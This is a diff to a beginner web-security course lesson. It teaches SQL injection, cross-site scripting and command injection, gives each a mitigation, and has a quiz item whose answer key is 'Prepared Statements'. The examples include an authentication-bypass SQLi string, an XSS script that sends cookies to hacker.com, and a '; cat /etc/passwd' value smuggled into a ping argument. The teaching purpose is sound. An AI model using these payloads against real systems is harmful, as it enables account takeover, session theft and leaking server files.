@@ -6,23 +6,73 @@ topic: "SQLi, XSS, Command Injection"
 difficulty: "Beginner"
 ---
 
-# Day 9: Web Vulnerabilities I (OWASP Top 10)
+# Day 9: Web Vulnerabilities I - Injection & Cross-Site Scripting
 
-Welcome to the world of Web Hacking! Almost everything is a web app today—from your bank to your thermostat. Today, we look at the most common ways they break.
-
-## Key Concepts
-- **SQL Injection (SQLi):** You trick a database into running a command it shouldn't by passing malicious inputs.
-- **Cross-Site Scripting (XSS):** You inject a malicious client-side script (usually JavaScript) into a website, which runs inside another user's browser.
-- **Command Injection:** You trick the web server's host system into running OS-level commands (like `ping` or listing directories).
+The web is the primary entry point for modern corporate environments. Today, we dive deep into the mechanics of three high-severity web exploits: SQL Injection, Cross-Site Scripting, and Command Injection.
 
 ---
 
-### Challenge: SQL Injection
-What is the full name of the vulnerability class (e.g., SQLi) where an attacker crafts input to manipulate backend database queries?
+## 1. SQL Injection (SQLi)
+
+**SQL Injection** occurs when unsanitized user inputs are concatenated directly into database query strings instead of using parameterization.
+
+```
+Concatenated Query:
+"SELECT * FROM users WHERE username = '" + userInput + "' AND password = '...'"
+
+If userInput is: admin' OR '1'='1
+The resulting query becomes:
+"SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'"
+```
+
+Since `'1'='1'` is always true, the database bypasses password authentication completely and logs the attacker in as the admin user!
+
+### Mitigation: Prepared Statements
+Always use **Prepared Statements (Parameterized Queries)**. Prepared statements compile the SQL query template *before* inserting user input. The database treats user inputs strictly as parameters (data literals) rather than executable code.
+
+---
+
+## 2. Cross-Site Scripting (XSS)
+
+**Cross-Site Scripting** occurs when an application receives untrusted data and displays it on a webpage without proper sanitization, allowing malicious JavaScript to execute in a victim's browser.
+
+```
+Malicious Payload Input: <script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>
+```
+
+### XSS Types:
+1. **Stored XSS (Persistent):** The payload is stored in a database (e.g., a forum comment) and executed every time users view that comment.
+2. **Reflected XSS (Non-Persistent):** The payload is reflected off the server via a URL parameter (e.g., a search field `?q=<script>...`). It executes only when a victim clicks on that custom link.
+3. **DOM-Based XSS:** The vulnerability exists entirely in the client-side JavaScript, which parses URL data and writes it directly to the document object model (DOM) without sanitization.
+
+### Mitigation: Context-Aware Output Encoding
+Sanitize and encode all outputs before rendering them in the HTML body, attribute values, or JavaScript context (e.g., translating `<` to `&lt;` and `>` to `&gt;`).
+
+---
+
+## 3. Command Injection
+
+**Command Injection** occurs when user input is passed directly to a system shell execution function (like `system()` in C, or `child_process.exec()` in Node.js) without sanitization.
+
+```
+Vulnerable backend code (pings an IP address):
+system("ping -c 3 " + userInput);
+
+If userInput is: 127.0.0.1 ; cat /etc/passwd
+The shell executes:
+ping -c 3 127.0.0.1 ; cat /etc/passwd
+```
+
+The semicolon `;` terminates the ping command, allowing the system to execute the secondary `cat` command and leak sensitive server files.
+
+---
+
+### Challenge: SQL Injection Defense
+What is the primary, industry-standard secure programming technique used to eliminate SQL Injection vulnerabilities by pre-compiling SQL query templates and treating inputs strictly as parameters?
 
 <Challenge
   id="day-9-sqli"
   type="input"
-  correctAnswer="SQL Injection"
-  placeholder="Enter vulnerability name..."
+  correctAnswer="Prepared Statements"
+  placeholder="Enter security technique..."
 />
